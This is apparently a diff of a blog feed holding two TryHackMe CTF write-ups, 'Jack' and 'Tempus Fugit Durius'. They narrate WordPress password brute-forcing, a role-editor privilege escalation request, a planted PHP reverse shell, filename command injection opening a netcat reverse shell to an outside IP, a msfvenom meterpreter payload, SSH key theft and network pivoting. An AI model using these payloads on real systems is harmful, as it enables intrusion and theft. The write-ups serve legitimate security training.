+&lt;p&gt;I save those names to a file then perform a password attack using the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wpscan --url jack.thm -U loot/users.txt -P /opt/wordlists/fasttrack.txt | tee scans/wpscan-users.txt&lt;/code&gt;. After about a minute, it finds the password for the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wendy&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/jack/WPScan-Valid-Password-Output.png&quot; alt=&quot;Screenshot of WPScan Finding the Right Password&quot; /&gt;
+ &lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;user&quot;&gt;User&lt;/h1&gt;
+&lt;p&gt;After logging into Wordpress as the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wendy&lt;/code&gt;, I find that I only have a regular user’s Wordpress permissions. I know that achieving code execution as an Admin user would be trivial, so I try to search for ways to pivot to an Admin account or escalate my Wordpress user privileges.&lt;/p&gt;
+
+&lt;p&gt;Using &lt;a href=&quot;https://github.com/offensive-security/exploitdb/blob/master/searchsploit&quot;&gt;searchsploit&lt;/a&gt; to search for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wordpress privilege&lt;/code&gt; finds me a variety of exploits. And after poking around at them I find one that works. It’s titled &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WordPress Plugin User Role Editor &amp;lt; 4.25 - Privilege Escalation&lt;/code&gt; and has a Metasploit ruby module at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php/webapps/44595.rb&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;From looking at the code, and reading the module description, the User Role Editor plugin has a problem with its authorization check when it updates a user’s profile. This allows the user to arbitrarily edit their own profile to grant themselves administrator privileges. Further reading can be done &lt;a href=&quot;https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;I go to edit my profile, change an arbitrary value like my first name, and then capture the POST request in Burp suite. After adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ure_other_roles=administrator&lt;/code&gt; to the request body and letting the request go through, the page refreshes and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wendy&lt;/code&gt; user account now has administrator privileges.&lt;/p&gt;
+
+&lt;p&gt;Here is what the captured request looks like, with the edit included:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /wp-admin/profile.php HTTP/1.1
+Host: jack.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://jack.thm/wp-admin/profile.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 318
+Connection: close
+Cookie: &amp;lt;--Snipped for Brevity--&amp;gt;
+Upgrade-Insecure-Requests: 1
+
+_wpnonce=473e4f45c7&amp;amp;_wp_http_referer=%2Fwp-a&amp;lt;--Snipped!--&amp;gt;file&amp;amp;ure_other_roles=administrator 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With administrator privileges, it is trivial to get command execution on the underlying server. I go to the plugins page, add a Linux PHP reverse-shell code to a deactivated plugin, then activate the plugin and catch a reverse shell with a Netcat listener.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: PHP Reverse Shells are OS-dependent. Don’t get stuck trying to use a Linux PHP Reverse Shell on a Windows server or vice versa.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/jack/WWW-Shell.png&quot; alt=&quot;Screenshot of Shell as www-data&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I briefly enumerate the file system for anything out of place, and notice a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/backups&lt;/code&gt; directory. After looking at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; and seeing the user entry for a user named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jack&lt;/code&gt; I connect the dots and copy the RSA private key over to my local machine.&lt;/p&gt;
+
+&lt;p&gt;I then use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod 600 id_rsa.jack&lt;/code&gt; to change the key file’s permissions and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh jack@jack.thm -i id_rsa.jack&lt;/code&gt; to SSH into the machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/jack/Jack-Shell.png&quot; alt=&quot;Screenshot of chmod and Shell as Jack&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;root&quot;&gt;Root&lt;/h1&gt;
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; command is the first command I ever run when I enter into a Linux environment as a certain user for the first time. A user’s group membership is something I like to keep in mind as I enumerate through different privilege escalation methods and as I interact with the file system in general.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The first command I run in a new Linux environment is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;. In a Windows environment, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami /all&lt;/code&gt; is usually the first command I run.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/jack/Jack-id.png&quot; alt=&quot;Screenshot of id Command as Jack&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In this case, the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jack&lt;/code&gt; is part of the following groups:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;jack&lt;/li&gt;
+  &lt;li&gt;adm&lt;/li&gt;
+  &lt;li&gt;cdrom&lt;/li&gt;
+  &lt;li&gt;dip&lt;/li&gt;
+  &lt;li&gt;plugdev&lt;/li&gt;
+  &lt;li&gt;lpadmin&lt;/li&gt;
+  &lt;li&gt;sambashare&lt;/li&gt;
+  &lt;li&gt;family&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Given that this is a CTF, I presume that most of these groups are there for distraction, but the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adm&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;family&lt;/code&gt; group memberships stick out to me. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adm&lt;/code&gt; sticks out because it is often privy to usefol log files and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;family&lt;/code&gt; sticks out because it is a custom group; it is a group that has been manually created for some reason.&lt;/p&gt;
+
+&lt;p&gt;I use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find / -group family 2&amp;gt;/dev/null&lt;/code&gt; to find what files belong to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;family&lt;/code&gt; group and am surprised to see an output full of Python2.7 modules. Here’s an excerpt of what that looked like:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/lib/python2.7/weakref.py
+/usr/lib/python2.7/sgmllib.pyc
+/usr/lib/python2.7/os.py
+/usr/lib/python2.7/posixpath.py
+/usr/lib/python2.7/copy_reg.py                                                                             
+/usr/lib/python2.7/bdb.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With the ability to edit core Python2.7 modules, privilege escalation is trivial. I just need to find a program running as root that uses Python2.7.&lt;/p&gt;
+
+&lt;p&gt;I dig around further and find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/statuscheck&lt;/code&gt; directory. In this directory, there is a Python script called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checker.py&lt;/code&gt; that imports the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os&lt;/code&gt; module, which is a module I have the privilege to edit.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import os
+
+os.system(&quot;/usr/bin/curl -s -I http://127.0.0.1 &amp;gt;&amp;gt; /opt/statuscheck/output.log&quot;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;By looking at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;output.log&lt;/code&gt; file in the same directory, I can see that the script is run every 2 minutes. All I have to do is edit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/lib/python2.7/os.py&lt;/code&gt; file and any code I add to it will be executed every two minutes, presumably as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; user.&lt;/p&gt;
+
+&lt;p&gt;There are a lot of ways to escalate privileges, or just do anything, when you have arbitrary code execution. In this case, I decided to be lazy and simply added code to copy the root flag to a file in my user’s directory. I appended &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system(&quot;cat /root/root.txt &amp;gt;&amp;gt; /home/jack/root.txt;chmod 777 /home/jack/root.txt&quot;)&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.py&lt;/code&gt; file, and waited two minutes.&lt;/p&gt;
+
+&lt;p&gt;After the two minutes, I found the root flag is sitting patiently in my home directory.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/jack/Root-Flag.png&quot; alt=&quot;Screenshot of Cat /home/Jack/root.txt&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;take-aways&quot;&gt;Take Aways&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;If a website is using a CMS, enumerate for common vulnerabilities and misconfigurations of that CMS. A lot of scanning tools exist that are specific to a CMS.&lt;/li&gt;
+  &lt;li&gt;Check common backup locations, like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/backups/&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Always enumerate based on your user’s groups.&lt;/li&gt;
+  &lt;li&gt;Pay careful attention to groups which appear to have been custom-made.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;tools&quot;&gt;Tools&lt;/h1&gt;
+&lt;dl&gt;
+  &lt;dt&gt;&lt;br /&gt;&lt;/dt&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://github.com/RustScan/RustScan&quot;&gt;Rustscan&lt;/a&gt;&lt;/dd&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://github.com/nmap/nmap&quot;&gt;nmap&lt;/a&gt;&lt;/dd&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://github.com/wpscanteam/wpscan&quot;&gt;wpscan&lt;/a&gt;&lt;/dd&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://gitlab.com/kalilinux/packages/set/-/raw/2053787e02992b5cbf95192ae4b66a750bbcef7f/src/fasttrack/wordlist.txt&quot;&gt;FastTrack Word List&lt;/a&gt;&lt;/dd&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://github.com/offensive-security/exploitdb/blob/master/searchsploit&quot;&gt;searchsploit&lt;/a&gt;&lt;/dd&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://portswigger.net/burp&quot;&gt;Burp Suite&lt;/a&gt;&lt;/dd&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;Linux PHP Reverse Shell&lt;/a&gt;&lt;/dd&gt;
+&lt;/dl&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Archive - CTF Writeup - Tempus Fugit Durius {THM}</title>
+   <link href="https://h0th.lol/2020/10/29/tfg-ctf-archive"/>
+   <updated>2020-10-29T00:00:00-05:00</updated>
+   <id>https://h0th.lol/2020/10/29/tfg-ctf-archive</id>
+   <content type="html">&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;An archive of an old writeup I wrote about the THM room “Tempus Fugit Durius”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/tempusfugitdurius&quot;&gt;Tempus Fugit Durius&lt;/a&gt; is one of my favorite CTF boxes on &lt;a href=&quot;https://tryhackme.com/signup&quot;&gt;TryHackMe&lt;/a&gt;. It’s a box that implements a lot of my favorite things in CTFs: Webapps, Pivoting, and Proxying.&lt;/p&gt;
+
+&lt;p&gt;It’s also somewhat close to my heart. It was one of the first difficult CTF boxes that I ever completed when I first got into doing CTFs. I remember working on this box for a straight 16 hours, just captivated by the challenge, and always feeling close to the next step. It was an incredibly fun experience. 
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h1&gt;
+&lt;p&gt;As always, real hackers hack time, and as I value my time when doing CTFs I like to start with Rustscan. The command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rustscan -r 0-65535 --ulimit 5000 10.10.36.206 -- -A -oN scans/nmap.txt&lt;/code&gt; blasts all TCP ports on the target machine to ascertain which ports are open, then automatically performs an nmap scan with the options &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-A -oN scans/nmap.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Rustscan.png&quot; alt=&quot;Screenshot of Rustscan Initial Screen&quot; /&gt;
+The open ports are:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;22&lt;/li&gt;
+  &lt;li&gt;80&lt;/li&gt;
+  &lt;li&gt;111&lt;/li&gt;
+  &lt;li&gt;45413&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In this case, the port which I’m interested in is port 80. After navigating to the web page in my browser, I’m immediately drawn to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upload&lt;/code&gt; section.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Home_Page.png&quot; alt=&quot;Screenshot of Home Page&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So this endpoint is apparently used to uploads ‘scripts.’ I decided to upload a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.py&lt;/code&gt; with no contents as my first file upload, and caught the request in Burp Suite.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Upload_Page.png&quot; alt=&quot;Screenshot of Upload Page&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The web application responded by telling me that it only accepts &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.txt&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.rtf&lt;/code&gt;, so I continue to fuzz the upload form and immediately find a way to execute commands on the server. I am able to execute the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; shell command by injecting a semicolon after the file name, so that the entire filename submitted looks like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.txt;id&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Requests_and_Command_Execution.png&quot; alt=&quot;Screenshot of Request and Command Execution&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Having found a way to execute code on the machine, it’s around this time that I would consider the “reconnaissance” phase of a CTF to be over. If this were a real engagement or a bug bounty, I would continue to methodically fuzz each and every parameter that I can think of. 
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;user&quot;&gt;User&lt;/h1&gt;
+&lt;p&gt;I launch a netcat listener on port 53, because it’s an unlikely port to be restricted in case of firewalls.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/NC_Listener.png&quot; alt=&quot;Screenshot of NC Listener&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I attempt to execute a two-part command with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.txt;echo $SHELL;nc -h&lt;/code&gt; to find out what shell I’m using and what features their netcat binary has. Unfortunately, something about the command trips a filter and I’m receive a custom status code 500 error.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Request_and_Error.png&quot; alt=&quot;Screenshot of Request and Error&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After a few unsuccessful commands I simply try to initiate a reverse shell using netcat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.txt;nc 10.13.1.225 53 -e sh&lt;/code&gt; and I get a new error: “That filename was way too long!”&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Request_and_Too_Long.png&quot; alt=&quot;Screenshot of Request and Too Long Error&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To shorten the command I convert the IP address to a decimal format using &lt;a href=&quot;https://www.ultratools.com/tools/decimalCalc&quot;&gt;this&lt;/a&gt; website.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Ultratools.png&quot; alt=&quot;Screenshot of Website&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The new, slightly shortened command is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;t.txt;nc 168624609 53 -e sh&lt;/code&gt;. It works and I get a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www&lt;/code&gt; on the machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Catching_Shell.png&quot; alt=&quot;Screenshot of Listener Catching a Shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I look at the directory that I landed in and see that the web application is mainly based on Python. Catting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.py&lt;/code&gt; I find some hard coded FTP credentials.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FTP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ftp.mofo.pwn'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'someuser'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&amp;lt;!--Censored--&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+   &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UPLOAD_FOLDER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'rb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;storlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'STOR %s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;ftp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;quit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UPLOAD_FOLDER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;flash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Cannot connect to FTP-server&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/upload'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Unfortunately the server did not have an FTP client installed, so I was required to use the python module &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftplib&lt;/code&gt;, used in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.py&lt;/code&gt; file, to connect to the FTP server.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.4$ python                                                                                                                                          
+Python 3.6.8 (default, Jan 30 2019, 23:54:38)                                                                                                             
+[GCC 6.4.0] on linux
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&amp;gt;&amp;gt;&amp;gt; from ftplib import FTP
+&amp;gt;&amp;gt;&amp;gt; cnct = FTP(&quot;ftp.mofo.pwn&quot;)
+&amp;gt;&amp;gt;&amp;gt; cnct.login(&quot;someuser&quot;, &quot;&amp;lt;!--Censored--&amp;gt;&quot;)
+'230 Login successful.'
+&amp;gt;&amp;gt;&amp;gt; cnct.retrlines(&quot;LIST&quot;)
+-rw-------    1 ftp      ftp            24 Apr 22  2020 creds.txt
+-rw-------    1 ftp      ftp             0 Oct 23 21:57 test.txt;echo $SHELL
+-rw-------    1 ftp      ftp             0 Oct 23 21:52 test.txt;id
+-rw-------    1 ftp      ftp             0 Oct 23 21:58 test.txt;nc --help
+'226 Directory send OK.'
+&amp;gt;&amp;gt;&amp;gt; localfile = open('creds.txt', 'wb')
+&amp;gt;&amp;gt;&amp;gt; cnct.retrbinary('RETR ' + 'creds.txt', localfile.write, 1024)
+'226 Transfer complete.'
+&amp;gt;&amp;gt;&amp;gt; exit()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Creds_File.png&quot; alt=&quot;Screenshot of Creds.txt&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The creds seem to be for an account named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;. I attempt to SSH into the machine using those creds and also attempt to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su&lt;/code&gt; to switch to that user but both are unsuccessful. I decide to save the creds for later and continue enumerating the machine.&lt;/p&gt;
+
+&lt;p&gt;I noticed that the snippet of Python code used for the web application connects to an FTP server &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp.mofo.pwn&lt;/code&gt;. This stood out to me because it implied some resolution of that hostname to an IP address. I check the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file for more information and find an entry for a Class C internal IP address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.150.100 sid&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Etc_Hosts.png&quot; alt=&quot;Screenshot of /etc/hosts&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To scan the internal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.150.0/24&lt;/code&gt; address range, I decide to make a meterpreter reverse shell binary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=tun0 LPORT=443 -f elf -o peterelf&lt;/code&gt; and download it onto the victim machine using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt;. After that, I launch my msfconsole listener and execute the binary to catch a meterpreter reverse shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Downloading_Meterpreter.png&quot; alt=&quot;Screenshot of Downloading Meterpreter Binary&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Catching_Meterpreter.png&quot; alt=&quot;Screenshot of Catching Meterpreter Shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I use meterpreter’s autoroute functionality to automatically allow traffic from my local machine into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.150.0/24&lt;/code&gt; internal address space.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Autoroute.png&quot; alt=&quot;Screenshot of Autoroute&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After that I launched a socks5 server using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auxiliary/server/socks5&lt;/code&gt;, making sure that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SRVPORT&lt;/code&gt; value matches with the socks5 configuration in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/proxychains.conf&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/tempusfugitdurius/Proxychains_Conf.png&quot; alt=&quot;Screenshot of Proxychains.conf&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp.mofo.pwn&lt;/code&gt; requires some sort of DNS resolution, I decided to check &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/resolv.conf&lt;/code&gt; for any leads before beginning to scan the network. I didn’t find any IP addresses, but it did confirm my assumption about the network. This seems to be a network of boxes named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mofo.pwn&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.4$ cat /etc/resolv.conf
+search mofo.pwn
+nameserver 127.0.0.11
+options ndots:0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I run an nmap scan across the internet subnet through proxychains using the following command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxychains nmap -sV -p21,22,53,80,139,443,445 192.168.150.0/24 -oN scans/nmap-internal.txt&lt;/code&gt;. I try to scan as few ports as possible because this scan is going to take a long time.&lt;/p&gt;
+
